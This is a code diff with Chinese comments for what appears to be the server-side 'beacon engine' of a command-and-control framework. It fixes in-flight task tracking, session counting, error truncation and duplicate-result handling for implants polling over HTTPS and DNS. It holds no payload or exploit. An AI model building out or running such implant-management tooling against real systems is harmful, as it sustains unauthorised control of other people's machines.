@@ -16,25 +16,38 @@ logger = get_logger("beacon_engine")
 
 
 class InFlight:
-    """stateless 传输的任务在途登记：task_id → (result_processor, proc_arg)。
+    """stateless 传输的任务在途登记：task_id → (client_id, result_processor, proc_arg)。
 
     HTTPS/DNS 是无状态轮询：task 弹出即弃，result 在后续独立请求里回来，
     需要记住每个 task 的结果处理器信息才能跑结果处理器（download 续传）。
+    2026-09-04 B15: track 记录 client_id——beacon 超时清理时按 bid 清除
+    该 beacon 的在途登记, 防条目永久泄漏。
     """
 
     def __init__(self):
         self._d = {}
         self._lock = threading.Lock()
 
-    def track(self, task) -> None:
+    def track(self, task, client_id: str = "") -> None:
         if getattr(task, "result_processor", ""):
             with self._lock:
-                self._d[task.task_id] = (task.result_processor,
+                self._d[task.task_id] = (client_id,
+                                         task.result_processor,
                                          getattr(task, "proc_arg", ""))
 
     def take(self, task_id: str) -> tuple:
         with self._lock:
-            return self._d.pop(task_id, ("", ""))
+            v = self._d.pop(task_id, None)
+        if not v:
+            return "", ""
+        return v[1], v[2]
+
+    def remove_client(self, client_id: str) -> None:
+        """清除某 beacon 的全部在途登记(超时清理时调用)。"""
+        with self._lock:
+            stale = [k for k, v in self._d.items() if v[0] == client_id]
+            for k in stale:
+                del self._d[k]
 
 
 def register_beacon(reg: dict, mgr, events) -> tuple:
@@ -51,7 +64,7 @@ def register_beacon(reg: dict, mgr, events) -> tuple:
             rec.is_fork = True
         rec.is_shell = is_shell
         rec.running_tasks = list(reg.get("running") or [])  # 植入物上报的运行中任务
-        rec.active = True
+        rec.active += 1     # 会话计数(B15): 重叠会话各自 +1, close 各 -1
     events.emit(EVT_CONNECT, client_id, first=bool(is_new), via=via or None,
                 fork=is_fork or None, shell=is_shell or None)
     return client_id, is_new
@@ -60,12 +73,25 @@ def register_beacon(reg: dict, mgr, events) -> tuple:
 def store_result(client_id, task_id, output, error, mgr, events,
                  max_result_size, smods=None, dispatcher=None,
                  result_processor="", proc_arg="", overwrite=False):
-    """结果截断 + 落库 + 事件 + 结果处理器（三传输共用）。"""
+    """结果截断 + 落库 + 事件 + 结果处理器（三传输共用）。
+
+    注意: add_result 按 task_id 去重——重复上报(ACK 丢失后 implant 重发)
+    返回 False,此时**跳过事件与结果处理器**:处理器(如 download_parse 按
+    chunk 追加写盘)对重复结果重复执行会造成文件损坏/任务重复入队,
+    去重必须同时护住副作用(2026-09-04 修复)。
+    """
     if len(output) > max_result_size:
         output = (output[:max_result_size]
                   + f"\n... (truncated, {len(output)} bytes total)")
-    mgr.add_result(client_id, TaskResult(task_id=task_id, output=output,
-                                         error=error), overwrite=overwrite)
+    if len(error) > max_result_size:
+        # 2026-09-04 B15: error 与 output 同步截断(此前只截 output,
+        # 超长 traceback 能撑爆结果存储/前端渲染)
+        error = (error[:max_result_size]
+                 + f"\n... (truncated, {len(error)} bytes total)")
+    added = mgr.add_result(client_id, TaskResult(task_id=task_id, output=output,
+                                                 error=error), overwrite=overwrite)
+    if not added:
+        return  # 重复结果: 静默丢弃(不入事件、不跑结果处理器)
     events.emit(EVT_TASK_RESULT, client_id, task_id=task_id,
                 output=output[:200])
     if result_processor and smods is not None:
